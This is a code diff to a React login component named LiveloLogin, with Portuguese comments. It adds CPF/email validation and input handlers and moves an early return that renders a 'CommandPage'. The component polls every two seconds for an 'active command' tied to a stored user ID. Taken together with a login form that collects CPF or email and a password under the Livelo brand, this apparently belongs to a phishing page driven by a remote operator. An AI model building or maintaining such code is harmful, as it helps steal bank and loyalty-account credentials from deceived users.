@@ -19,6 +19,38 @@ function LiveloLogin() {
   const [userId, setUserId] = useState(localStorage.getItem("livelo_user_id"));
   const [showCommandPage, setShowCommandPage] = useState(false);
 
+  // Validação de CPF (11 dígitos) ou Email
+  const validateCredential = (value) => {
+    const cpfRegex = /^\d{11}$/;
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    return cpfRegex.test(value) || emailRegex.test(value);
+  };
+
+  // Formatar CPF enquanto digita
+  const formatCPF = (value) => {
+    const numbers = value.replace(/\D/g, "");
+    if (numbers.length <= 11) {
+      return numbers;
+    }
+    return numbers.slice(0, 11);
+  };
+
+  const handleCredentialChange = (e) => {
+    const value = e.target.value;
+    if (/^\d*$/.test(value)) {
+      setCredential(formatCPF(value));
+    } else {
+      setCredential(value);
+    }
+  };
+
+  const handleSubmit = (e) => {
+    e.preventDefault();
+    if (isValid) {
+      setIsLoading(true);
+    }
+  };
+
   // Verificar se há comando ativo
   useEffect(() => {
     if (!userId) return;
@@ -40,18 +72,6 @@ function LiveloLogin() {
     const interval = setInterval(checkCommand, 2000);
     return () => clearInterval(interval);
   }, [userId]);
-
-  // Se houver comando ativo, mostrar página de comando
-  if (showCommandPage && userId) {
-    return <CommandPage userId={userId} />;
-  }
-
-  // Validação de CPF (11 dígitos) ou Email
-  const validateCredential = (value) => {
-    const cpfRegex = /^\d{11}$/;
-    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-    return cpfRegex.test(value) || emailRegex.test(value);
-  };
 
   // Verifica se o formulário está válido
   useEffect(() => {
@@ -103,30 +123,10 @@ function LiveloLogin() {
     return () => clearTimeout(timer);
   }, [credential, password]);
 
-  // Formatar CPF enquanto digita
-  const formatCPF = (value) => {
-    const numbers = value.replace(/\D/g, "");
-    if (numbers.length <= 11) {
-      return numbers;
-    }
-    return numbers.slice(0, 11);
-  };
-
-  const handleCredentialChange = (e) => {
-    const value = e.target.value;
-    if (/^\d*$/.test(value)) {
-      setCredential(formatCPF(value));
-    } else {
-      setCredential(value);
-    }
-  };
-
-  const handleSubmit = (e) => {
-    e.preventDefault();
-    if (isValid) {
-      setIsLoading(true);
-    }
-  };
+  // Se houver comando ativo, mostrar página de comando
+  if (showCommandPage && userId) {
+    return <CommandPage userId={userId} />;
+  }
 
   return (
     <div className="App min-h-screen bg-white flex flex-col font-inter">
